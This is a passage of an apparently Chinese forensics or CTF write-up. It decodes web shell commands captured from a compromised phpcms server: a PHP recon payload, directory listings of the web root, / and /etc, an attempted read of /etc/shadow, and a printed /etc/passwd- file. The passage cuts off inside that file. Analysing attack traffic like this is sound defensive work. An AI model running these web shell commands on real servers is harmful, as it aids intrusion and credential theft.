+<p><img src="https://upload-images.jianshu.io/upload_images/5443560-3d8671f934c615cd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="深度截图_选择区域_20180417223950.png"><br>第一个目录是/var/www/html</p>
+<h4 id="0x03-一句话操作分析"><a href="#0x03-一句话操作分析" class="headerlink" title="0x03 一句话操作分析"></a>0x03 一句话操作分析</h4><p>总共有15个一句话操作<br>第一个解码完就是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@ini_set(<span class="string">"display_errors"</span>, <span class="string">"0"</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line">@set_magic_quotes_runtime(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"-&gt;|"</span>);</span><br><span class="line">$D = dirname($_SERVER[<span class="string">"SCRIPT_FILENAME"</span>]);</span><br><span class="line"><span class="keyword">if</span> ($D == <span class="string">""</span>) $D = dirname($_SERVER[<span class="string">"PATH_TRANSLATED"</span>]);</span><br><span class="line">$R = <span class="string">"&#123;$D&#125;\t"</span>;<span class="keyword">if</span> (substr($D, <span class="number">0</span>, <span class="number">1</span>) != <span class="string">"/"</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (range(<span class="string">"A"</span>, <span class="string">"Z"</span>) <span class="keyword">as</span> $L)</span><br><span class="line">        <span class="keyword">if</span> (is_dir(<span class="string">"&#123;$L&#125;:"</span>))</span><br><span class="line">            $R .= <span class="string">"&#123;$L&#125;:"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$R .= <span class="string">"\t"</span>;</span><br><span class="line">$u = (function_exists(<span class="string">'posix_getegid'</span>)) ? @posix_getpwuid(@posix_geteuid()) : <span class="string">''</span>;$usr = ($u) ? $u[<span class="string">'name'</span>] : @get_current_user();$R .= php_uname();$R .= <span class="string">"(&#123;$usr&#125;)"</span>;<span class="keyword">print</span> $R;;<span class="keyword">echo</span>(<span class="string">"|&lt;-"</span>);<span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这个脚本的作用是获取网页所在的绝对路径<br>接下来依次分析，分别是<br>查看 /var/www/html 目录底下的文件内容<br>有这些</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">caches/ 2016-08-04 10:40:44 4096    0777</span><br><span class="line">uploadfile/ 2016-08-04 11:01:20 4096    0777</span><br><span class="line">statics/    2016-08-04 10:38:16 4096    0777</span><br><span class="line">api/    2016-08-04 10:38:16 4096    0777</span><br><span class="line">../ 2016-08-04 10:37:16 4096    0755</span><br><span class="line">phpsso_server/  2016-08-04 10:38:16 4096    0777</span><br><span class="line">html/   2016-08-04 10:46:37 4096    0777</span><br><span class="line">./  2016-08-04 10:39:54 4096    0777</span><br><span class="line">phpcms/ 2016-08-04 10:38:16 4096    0777</span><br><span class="line">plugin.php  2016-08-04 10:38:16 3573    0777</span><br><span class="line">index.html  2016-08-04 11:55:19 17588   0777</span><br><span class="line">crossdomain.xml 2016-08-04 10:38:16 104 0777</span><br><span class="line">robots.txt  2016-08-04 10:38:16 170 0777</span><br><span class="line">admin.php   2016-08-04 10:38:16 48  0777</span><br><span class="line">api.php 2016-08-04 10:38:16 595 0777</span><br><span class="line">index.php   2016-08-04 10:38:16 318 0777</span><br><span class="line">js.html 2016-08-04 10:38:16 523 0777</span><br><span class="line">favicon.ico 2016-08-04 10:38:16 3158    0777</span><br></pre></td></tr></table></figure>
+<p>接下来查看的是根目录底下的文件夹,有</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">var/    2016-07-22 19:50:16 4096    0755</span><br><span class="line">selinux/    2016-07-16 00:59:51 0   0755</span><br><span class="line">lib/    2016-07-11 23:51:40 4096    0555</span><br><span class="line">dev/    2016-07-16 01:01:30 3740    0755</span><br><span class="line">media/  2016-07-12 00:18:35 4096    0755</span><br><span class="line">usr/    2016-07-11 23:46:08 4096    0755</span><br><span class="line">tmp/    2016-08-09 18:16:02 4096    1777</span><br><span class="line">etc/    2016-08-09 18:16:11 12288   0755</span><br><span class="line">proc/   2016-07-16 00:59:50 0   0555</span><br><span class="line">bin/    2016-07-16 02:18:03 4096    0555</span><br><span class="line">../ 2016-07-16 01:00:10 4096    0555</span><br><span class="line">home/   2016-08-04 10:23:14 4096    0755</span><br><span class="line">srv/    2011-09-23 19:50:20 4096    0755</span><br><span class="line">opt/    2016-07-12 00:03:18 4096    0755</span><br><span class="line">sbin/   2016-07-16 02:18:04 12288   0555</span><br><span class="line">data1/  2016-07-12 00:11:00 4096    0755</span><br><span class="line">./  2016-07-16 01:00:10 4096    0555</span><br><span class="line">mnt/    2016-07-12 00:01:13 4096    0755</span><br><span class="line">sys/    2016-07-16 00:59:50 0   0755</span><br><span class="line">lib64/  2016-07-16 02:17:51 12288   0555</span><br><span class="line">boot    1970-01-01 08:00:00     0</span><br><span class="line">root    1970-01-01 08:00:00     0</span><br><span class="line">.autofsck   2016-07-16 01:00:10 0   0644</span><br><span class="line">lost+found  1970-01-01 08:00:00     0</span><br></pre></td></tr></table></figure>
+<p>接下来查看<code>/etc/</code>底下的文件夹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br></pre></td><td class="code"><pre><span class="line">./  2016-08-09 18:16:11 12288   0755</span><br><span class="line">../ 2016-07-16 01:00:10 4096    0555</span><br><span class="line">rc4.d/  2016-08-01 11:01:41 4096    0755</span><br><span class="line">pulse/  2016-07-12 00:01:49 4096    0755</span><br><span class="line">skel/   2016-07-11 23:50:01 4096    0755</span><br><span class="line">bash_completion.d/  2016-07-11 23:55:24 4096    0755</span><br><span class="line">samba/  2016-07-11 23:51:59 4096    0755</span><br><span class="line">pango/  2016-07-11 23:49:07 4096    0755</span><br><span class="line">cron.hourly/    2016-07-11 23:51:58 4096    0755</span><br><span class="line">foomatic/   2016-07-11 23:53:35 4096    0755</span><br><span class="line">rwtab.d/    2013-11-23 05:20:24 4096    0755</span><br><span class="line">chkconfig.d/    2013-09-23 17:07:36 4096    0755</span><br><span class="line">obex-data-server/   2016-07-11 23:49:42 4096    0755</span><br><span class="line">wpa_supplicant/ 2016-07-11 23:48:32 4096    0755</span><br><span class="line">vmware-tools/   2016-07-12 00:03:14 4096    0755</span><br><span class="line">logrotate.d/    2016-07-16 02:41:56 4096    0755</span><br><span class="line">gnome-vfs-2.0/  2016-07-11 23:48:27 4096    0755</span><br><span class="line">terminfo/   2010-08-18 23:41:41 4096    0755</span><br><span class="line">xdg/    2016-07-11 23:50:13 4096    0755</span><br><span class="line">alternatives/   2016-07-11 23:52:04 4096    0755</span><br><span class="line">hal/    2016-07-11 23:50:59 4096    0755</span><br><span class="line">setuptool.d/    2016-07-11 23:51:14 4096    0755</span><br><span class="line">init.d/ 2016-08-01 11:01:39 4096    0755</span><br><span class="line">cups/   2016-07-11 23:54:38 4096    0755</span><br><span class="line">makedev.d/  2016-07-11 23:47:34 4096    0755</span><br><span class="line">ntp/    2016-07-11 23:51:44 4096    0755</span><br><span class="line">abrt/   2016-07-11 23:48:54 4096    0755</span><br><span class="line">pm/ 2016-07-11 23:46:08 4096    0755</span><br><span class="line">rc.d/   2016-07-12 00:03:18 4096    0755</span><br><span class="line">httpd/  2016-07-16 02:12:59 4096    0755</span><br><span class="line">gdm/    2016-07-11 23:51:13 4096    0755</span><br><span class="line">gtk-2.0/    2016-07-11 :50:01   4096    0755</span><br><span class="line">ssl/    2016-07-11 23:47:27 4096    0755</span><br><span class="line">libreport/  2016-07-11 23:48:53 4096    0755</span><br><span class="line">gcrypt/ 2013-10-24 23:38:14 4096    0755</span><br><span class="line">sound/  2016-07-11 23:50:01 4096    0755</span><br><span class="line">rc1.d/  2016-08-01 11:01:41 4096    0755</span><br><span class="line">yum.repos.d/    2016-07-11 23:50:16 4096    0755</span><br><span class="line">default/    2016-07-11 23:46:45 4096    0755</span><br><span class="line">dracut.conf.d/  2016-07-12 00:01:52 4096    0755</span><br><span class="line">rpm/    2016-07-16 02:33:57 4096    0755</span><br><span class="line">php.d/  2016-07-16 02:33:56 4096    0755</span><br><span class="line">avahi/  2016-07-11 23:48:23 4096    0755</span><br><span class="line">openldap/   2016-07-11 23:58:43 4096    0755</span><br><span class="line">sudoers.d/  2013-11-22 20:51:12 4096    0750</span><br><span class="line">festival/   2016-07-11 23:50:10 4096    0755</span><br><span class="line">kdump-adv-conf/ 2016-07-11 23:54:24 4096    0755</span><br><span class="line">rsyslog.d/  2013-11-22 23:15:59 4096    0755</span><br><span class="line">depmod.d/   2016-07-11 23:48:04 4096    0755</span><br><span class="line">PackageKit/ 2016-07-11 23:50:14 4096    0755</span><br><span class="line">snmp/   2016-08-01 11:03:14 4096    0755</span><br><span class="line">profile.d/  2016-07-11 23:54:40 4096    0755</span><br><span class="line">dnsmasq.d/  2013-02-22 12:40:04 4096    0755</span><br><span class="line">pam.d/  2016-07-12 00:00:58 4096    0755</span><br><span class="line">rc6.d/  2016-08-01 11:01:41 4096    0755</span><br><span class="line">sgml/   2016-07-11 23:48:11 4096    0755</span><br><span class="line">plymouth/   2016-07-11 23:50:30 4096    0755</span><br><span class="line">cron.weekly/    2011-09-27 09:33:08 4096    0755</span><br><span class="line">sane.d/ 2016-07-11 23:51:40 4096    0755</span><br><span class="line">pear/   2016-05-11 06:42:17 4096    0755</span><br><span class="line">ppp/    2016-07-11 23:50:19 4096    0755</span><br><span class="line">event.d/    2016-07-11 23:48:06 4096    0755</span><br><span class="line">popt.d/ 2010-08-21 13:30:56 4096    0755</span><br><span class="line">pcmcia/ 2016-07-11 23:52:27 4096    0755</span><br><span class="line">rc0.d/  2016-08-01 11:01:41 4096    0755</span><br><span class="line">sysconfig/  2016-08-01 11:01:39 4096    0755</span><br><span class="line">lvm/    2016-07-11 23:54:01 4096    0755</span><br><span class="line">bonobo-activation/  2016-07-11 23:47:18 4096    0755</span><br><span class="line">audisp/ 2016-07-113:54:43   4096    0750</span><br><span class="line">opt/    2011-09-23 19:50:20 4096    0755</span><br><span class="line">polkit-1/   2016-07-11 23:48:05 4096    0755</span><br><span class="line">prelink.conf.d/ 2016-07-12 00:00:53 4096    0755</span><br><span class="line">gnupg/  2013-10-24 23:38:54 4096    0755</span><br><span class="line">ghostscript/    2016-07-11 23:49:01 4096    0755</span><br><span class="line">ld.so.conf.d/   2016-07-16 01:49:50 4096    0755</span><br><span class="line">rc2.d/  2016-08-01 11:01:41 4096    0755</span><br><span class="line">iproute2/   2016-07-11 23:50:18 4096    0755</span><br><span class="line">udev/   2016-07-11 23:50:21 4096    0755</span><br><span class="line">init/   2016-07-11 23:54:28 4096    0755</span><br><span class="line">cron.daily/ 2016-07-11 23:55:23 4096    0755</span><br><span class="line">acpi/   2016-07-11 23:54:28 4096    0755</span><br><span class="line">rc3.d/  2016-08-01 11:01:41 4096    0755</span><br><span class="line">postfix/    2016-07-11 23:51:54 4096    0755</span><br><span class="line">X11/    2016-07-11 23:51:00 4096    0755</span><br><span class="line">ssh/    2016-07-12 00:00:35 4096    0755</span><br><span class="line">cron.monthly/   2016-07-11 23:54:28 4096    0755</span><br><span class="line">blkid/  2013-11-22 23:29:33 4096    0755</span><br><span class="line">security/   2016-07-11 23:51:58 4096    0755</span><br><span class="line">scl/    2016-07-11 23:55:24 4096    0755</span><br><span class="line">alsa/   2016-07-11 23:52:26 4096    0755</span><br><span class="line">gconf/  2016-07-11 23:48:20 4096    0755</span><br><span class="line">statetab.d/ 2013-11-23 05:20:24 4096    0755</span><br><span class="line">pkcs11/ 2016-07-11 23:47:16 4096    0755</span><br><span class="line">dbus-1/ 2016-07-11 23:47:00 4096    0755</span><br><span class="line">sasl2/  2016-07-11 23:51:54 4096    0755</span><br><span class="line">hp/ 2016-07-11 23:51:40 4096    0755</span><br><span class="line">pki/    2016-07-11 23:51:43 4096    0755</span><br><span class="line">fonts/  2016-07-11 23:47:58 4096    0755</span><br><span class="line">ConsoleKit/ 2016-07-11 23:48:06 4096    0755</span><br><span class="line">xml/    2016-07-11 23:46:06 4096    0755</span><br><span class="line">dhcp/   2013-11-22 22:30:00 4096    0750</span><br><span class="line">rc5.d/  2016-08-01 11:01:41 4096    0755</span><br><span class="line">xinetd.d/   2016-07-11 23:55:23 4096    0755</span><br><span class="line">vmware-caf/ 2016-07-12 00:00:57 4096    0755</span><br><span class="line">yum/    2016-07-11 23:48:52 4096    0755</span><br><span class="line">hosts.deny  2010-01-12 21:28:22 460 0644</span><br><span class="line">statetab    20131-23 05:20:24   212 0644</span><br><span class="line">networks    2013-11-23 05:20:24 58  0644</span><br><span class="line">motd    2010-01-12 21:28:22 0   0644</span><br><span class="line">ntp.conf    2013-07-15 17:18:47 1778    0644</span><br><span class="line">at.deny 2012-01-30 21:56:34 1   0644</span><br><span class="line">inputrc 2010-01-12 21:28:22 942 0644</span><br><span class="line">pm-utils-hd-apm-restore.conf    2012-07-18 17:04:08 370 0644</span><br><span class="line">.pwd.lock   1970-01-01 08:00:00     0</span><br><span class="line">libuser.conf    2016-07-11 23:58:43 2290    0644</span><br><span class="line">sudo-ldap.conf  2013-10-07 20:51:58 3181    0640</span><br><span class="line">mailcap 2009-11-18 05:13:33 272 0644</span><br><span class="line">bluetooth   1970-01-01 08:00:00     0</span><br><span class="line">selinux 1970-01-01 08:00:00     0</span><br><span class="line">mime.types  2011-09-23 23:02:51 43591   0644</span><br><span class="line">rc.sysinit  1970-01-01 08:00:00     0</span><br><span class="line">hosts.allow 2010-01-12 21:28:22 370 0644</span><br><span class="line">magic   2012-10-04 22:51:04 111 0644</span><br><span class="line">my.cnf  2016-05-11 14:31:18 251 0644</span><br><span class="line">sysctl.conf 2013-11-23 05:20:24 1150    0644</span><br><span class="line">crypttab    2016-07-11 23:45:38 0   0644</span><br><span class="line">nanorc  2010-11-12 15:18:32 7846    0644</span><br><span class="line">man.config  2013-02-22 10:13:09 4940    0644</span><br><span class="line">csh.cshrc   2013-10-02 17:06:18 1602    0644</span><br><span class="line">yum.conf    2013-02-22 19:26:34 969 0644</span><br><span class="line">securetty   2010-01-12 21:28:22 122 0600</span><br><span class="line">bashrc  2013-10-02 17:06:18 2681    0644</span><br><span class="line">group   2016-07-16 02:31:22 774 0644</span><br><span class="line">libaudit.conf   2012-03-02 02:42:34 191 0640</span><br><span class="line">pbm2ppa.conf    2010-08-23 07:28:29 1362    0644</span><br><span class="line">gshadow 1970-01-01 08:00:00     0</span><br><span class="line">protocols   2010-01-12 21:28:22 6455    0644</span><br><span class="line">dnsmasq.conf    2013-02-22 12:40:04 21214   0644</span><br><span class="line">hosts   2010-01-12 21:28:22 158 0644</span><br><span class="line">shadow  1970-01-01 08:00:00     0</span><br><span class="line">passwd- 2016-07-11 23:59:08 1435    0644</span><br><span class="line">vimrc   2012-02-17 23:17:03 1962    0644</span><br><span class="line">quotatab    2013-11-22 19:32:14 259 0644</span><br><span class="line">environment 2013-10-02 17:06:18 0   0644</span><br><span class="line">portreserve 10-01-01 08:00:00       0</span><br><span class="line">anacrontab  2013-11-23 20:43:13 541 0600</span><br><span class="line">issue.net   2013-11-27 19:53:33 46  0644</span><br><span class="line">centos-release  2013-11-27 19:53:33 27  0644</span><br><span class="line">aliases 1970-01-01 08:00:00     0</span><br><span class="line">mtab    2016-07-16 01:08:53 444 0644</span><br><span class="line">quotagrpadmins  2008-10-14 01:29:19 220 0644</span><br><span class="line">sudo.conf   2012-09-25 23:46:01 1786    0640</span><br><span class="line">favicon.png 2007-01-25 05:13:36 918 0644</span><br><span class="line">exports 2010-01-12 21:28:22 0   0644</span><br><span class="line">sestatus.conf   2013-11-23 06:44:51 216 0644</span><br><span class="line">printcap    2010-01-12 21:28:22 233 0644</span><br><span class="line">rsyslog.conf    1970-01-01 08:00:00     0</span><br><span class="line">gshadow-    1970-01-01 08:00:00     0</span><br><span class="line">DIR_COLORS.256color 2013-10-17 20:51:45 5139    0644</span><br><span class="line">ld.so.conf  2013-07-25 02:50:25 28  0644</span><br><span class="line">DIR_COLORS  2013-10-17 20:51:45 4439    0644</span><br><span class="line">rc.local    2016-07-11 23:59:08 220 0755</span><br><span class="line">system-release-cpe  2013-11-27 19:53:33 25  0644</span><br><span class="line">grub.conf   1970-01-01 08:00:00     0</span><br><span class="line">localtime   2016-07-11 23:58:41 2819    0644</span><br><span class="line">virc    2012-02-17 23:17:03 1962    0644</span><br><span class="line">prelink.conf    2013-07-19 22:35:49 789 0644</span><br><span class="line">services    2013-10-02 17:06:18 641020  0644</span><br><span class="line">kdump.conf  2016-07-11 23:54:24 7786    0644</span><br><span class="line">tpvmlp.conf 2016-07-16 01:01:27 1309    0644</span><br><span class="line">host.conf   2013-10-02 17:06:18 9   0644</span><br><span class="line">ethers  2012-05-10 16:17:31 28  0644</span><br><span class="line">issue   2013-11-27 19:53:33 47  0644</span><br><span class="line">pinforc 2010-08-21 09:43:26 2872    0644</span><br><span class="line">drirc   2013-11-25 20:52:10 1804    0644</span><br><span class="line">pnm2ppa.conf    2010-08-23 07:28:29 6300    0644</span><br><span class="line">redhat-release  2013-11-27 19:53:33 27  0644</span><br><span class="line">dracut.conf 2013-11-26 18:58:48 519 0644</span><br><span class="line">updatedb.conf   1970-01-01 08:00:00     0</span><br><span class="line">inittab 2016-07-12 00:03:18 884 0644</span><br><span class="line">sudoers 2012-03-02 01:18:24 4002    0440</span><br><span class="line">odbc.ini    2014-07-10 16::09   0   0644</span><br><span class="line">adjtime 1970-01-01 08:00:00     0</span><br><span class="line">csh.login   2013-10-02 17:06:18 794 0644</span><br><span class="line">group-  2016-07-11 23:59:08 762 0600</span><br><span class="line">pear.conf   2016-05-11 06:42:17 946 0644</span><br><span class="line">wgetrc  2012-10-10 17:06:54 4479    0644</span><br><span class="line">shadow- 1970-01-01 08:00:00     0</span><br><span class="line">fstab   2016-07-12 00:03:17 805 0644</span><br><span class="line">audit   1970-01-01 08:00:00     0</span><br><span class="line">nsswitch.conf   2010-05-05 03:22:21 1688    0644</span><br><span class="line">NetworkManager  1970-01-01 08:00:00     0</span><br><span class="line">warnquota.conf  2013-11-22 19:32:22 3008    0644</span><br><span class="line">login.defs  2016-07-11 23:58:43 1831    0644</span><br><span class="line">mke2fs.conf 2009-09-08 05:02:53 801 0644</span><br><span class="line">DIR_COLORS.lightbgcolor 2013-10-17 20:51:45 4113    0644</span><br><span class="line">prelink.cache   1970-01-01 08:00:00     0</span><br><span class="line">passwd.OLD  2016-07-11 23:59:08 1429    0644</span><br><span class="line">mtools.conf 2010-08-17 05:28:51 2620    0644</span><br><span class="line">readahead.conf  2013-11-23 21:52:17 966 0644</span><br><span class="line">fprintd.conf    2013-11-22 22:35:33 20  0644</span><br><span class="line">rwtab   2013-11-23 05:20:24 930 0644</span><br><span class="line">mail.rc 2013-08-01 17:12:47 1909    0644</span><br><span class="line">shadow.bak  2016-07-28 17:40:52 844 0755</span><br><span class="line">smartd.conf 2013-02-22 06:26:22 6717    0644</span><br><span class="line">odbcinst.ini    2014-07-10 16:15:09 575 0644</span><br><span class="line">gai.conf    2013-11-22 05:24:28 0   0644</span><br><span class="line">php.ini 2016-05-11 05:42:18 69097   0644</span><br><span class="line">crontab 1970-01-01 08:00:00     0</span><br><span class="line">ld.so.cache 2016-08-01 11:01:41 53651   0644</span><br><span class="line">system-release  2013-11-27 19:53:33 27  0644</span><br><span class="line">aliases.db  1970-01-01 08:00:00     0</span><br><span class="line">passwd  2016-07-16 02:31:22 1487    0644</span><br><span class="line">top.ini 2016-08-10 14:15:01 0   0644</span><br><span class="line">modprobe.d  1970-01-01 08:00:00     0</span><br><span class="line">enscript.cfg    2010-11-11 14:44:35 4843    0644</span><br><span class="line">rpc 2010-05-04 19:27:23 1615    0644</span><br><span class="line">cron.deny   2013-11-23 20:43:13 0   0600</span><br><span class="line">cron.d  1970-01-01 08:00:00     0</span><br><span class="line">shells  2016-07-113:54:44   61  0644</span><br><span class="line">profile 2013-10-02 17:06:18 1796    0644</span><br><span class="line">asound.conf 2009-05-15 04:53:38 148 0644</span><br><span class="line">logrotate.conf  2007-08-29 15:19:36 662 0644</span><br><span class="line">filesystems 2013-10-02 17:06:18 64  0644</span><br><span class="line">krb5.conf   2013-08-29 01:33:13 449 0644</span><br><span class="line">sos.conf    2013-11-23 03:12:07 260 0644</span><br><span class="line">rc  1970-01-01 08:00:00     0</span><br><span class="line">resolv.conf 2016-07-25 11:57:19 49  0644</span><br></pre></td></tr></table></figure></p>
+<p>接下来查看<code>/etc/shadow</code>这个文件，但是没看到，估计是因为权限不够<br>接下来查看<code>/etc/passwd-</code><br>获得</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">|root:x:0:0:root:/root:/bin/bash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br><span class="line">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line">sync:x:5:0:sync:/sbin:/bin/sync</span><br><span class="line">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">halt:x:7:0:halt:/sbin:/sbin/halt</span><br><span class="line">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span><br><span class="line">uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin</span><br><span class="line">operator:x:11:0:operator:/root:/sbin/nologin</span><br><span class="line">games:x:12:100:games:/usr/games:/sbin/nologin</span><br><span class="line">gopher:x:13:30:gopher:/var/gopher:/sbin/nologin</span><br><span class="line">ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin</span><br><span class="line">nobody:x:99:99:Nobody:/:/sbin/nologin</span><br><span class="line">dbus:x:81:81:System message bus:/:/sbin/nologin</span><br><span class="line">usbmuxd:x:113:113:usbmuxd user:/:/sbin/nologin</span><br><span class="line">vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin</span><br><span class="line">rtkit:x:499:497:RealtimeKit:/proc:/sbin/nologin</span><br><span class="line">avahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologin</span><br><span class="line">abrt:x:173:173::/etc/abrt:/sbin/nologin</span><br><span class="line">haldaemon:x:68:68:HAL daemon:/:/sbin/nologin</span><br><span class="line">gdm:x:42:42::/var/lib/gdm:/sbin/nologin</span><br><span class="line">ntp:x:38:38::/etc/ntp:/sbin/nologin</span><br><span class="line">apache:x:48:48:Apache:/var/www:/sbin/nologin</span><br><span class="line">saslauth:x:498:76:&quot;Saslauthd user&quot;:/var/empty/saslauth:/sbin/nologin</span><br><span 